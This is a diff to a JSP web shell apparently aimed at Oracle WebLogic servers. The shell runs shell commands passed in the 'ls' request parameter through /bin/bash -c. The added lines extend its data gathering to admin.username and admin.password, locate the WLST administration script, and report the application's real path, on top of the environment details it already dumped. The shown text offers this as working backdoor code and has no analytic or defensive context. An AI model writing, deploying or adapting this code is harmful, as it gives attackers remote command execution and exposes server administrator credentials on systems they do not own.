@@ -1,12 +1,20 @@
 <%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%
 //  trimDirectiveWhitespaces="true"
-String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c", szSys = "\n",szKeys = "JAVA_HOME,SERVER_NAME,PWD,LONG_DOMAIN_HOME,BEA_HOME,LOGNAME,USER,DOMAIN_HOME,SSH_CONNECTION,OLDPWD,MW_HOME,WL_HOME,WLS_HOME,os.name,weblogic.Name,user.name,weblogic.home,java.security.policy,user.home,wls.home,user.dir,WLS_POLICY_FILE,HOSTNAME,USERNAME,HOMEPATH,LOCALAPPDATA,USERDOMAIN,LOGONSERVER,OS,USERPROFILE,vde.home,";
+String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c", szSys = "\n",szTmp = "",s1 = null,s2 = null,
+szKeys = "admin.username,admin.password,JAVA_HOME,SERVER_NAME,PWD,LONG_DOMAIN_HOME,BEA_HOME,LOGNAME,USER,DOMAIN_HOME,SSH_CONNECTION,OLDPWD,MW_HOME,WL_HOME,WLS_HOME,os.name,weblogic.Name,user.name,weblogic.home,java.security.policy,user.home,wls.home,user.dir,WLS_POLICY_FILE,HOSTNAME,USERNAME,HOMEPATH,LOCALAPPDATA,USERDOMAIN,LOGONSERVER,OS,USERPROFILE,vde.home,java.vm.specification.version,os.version";
 String bsK = "bash";
 Map<String, String> env = System.getenv();
 for (String envName : env.keySet())
 {
     if(null != envName && -1 < szKeys.indexOf(envName))
-    szSys += envName + "=\"" + env.get(envName) + "\"\n";
+    {
+        szSys += envName + "=\"" + env.get(envName) + "\"\n";
+        if("WL_HOME".equalsIgnoreCase(envName))
+            s1 = env.get(envName);
+        else if("os.name".equalsIgnoreCase(envName))
+            s2 = env.get(envName);
+        
+    }
 }
 
 Properties capitals = System.getProperties();
@@ -14,8 +22,33 @@ Set states = capitals.keySet();
 for (Object name : states)
 {
     if(null != name && -1 < szKeys.indexOf((String)name))
-    szSys += (String)name + "=\"" + (String)capitals.getProperty((String) name) + "\"\n";
+    {
+        szSys += (String)name + "=\"" + (String)capitals.getProperty((String) name) + "\"\n";
+        if("WL_HOME".equalsIgnoreCase((String)name))
+            s1 = capitals.getProperty((String) name);
+        else if("os.name".equalsIgnoreCase((String)name))
+            s2 = capitals.getProperty((String) name);
+    }
 }
+
+if(null != s1 && null != s2)
+{
+    boolean bRst = -1 < s2.indexOf("Linux");
+    szTmp = s1 + "/common/bin/wlst." + (bRst?"sh":"cmd");
+    if(!bRst)
+        szTmp = szTmp.replace("/","\\");
+
+    if(new java.io.File(szTmp).exists())
+        szSys += "wlst=\"" + szTmp + "\"\n";
+}
+if(null != request.getServletContext())
+{
+    try{
+        String szKK = request.getServletContext().getResource("/").toString();
+        szSys += "curRealPath=\"" + szKK + "\"";
+    }catch(Exception e){}
+}
+    
 
 if(-1 < szSys.indexOf("Windows") || null != cmd && -1 < cmd.indexOf("cmd"))
 {
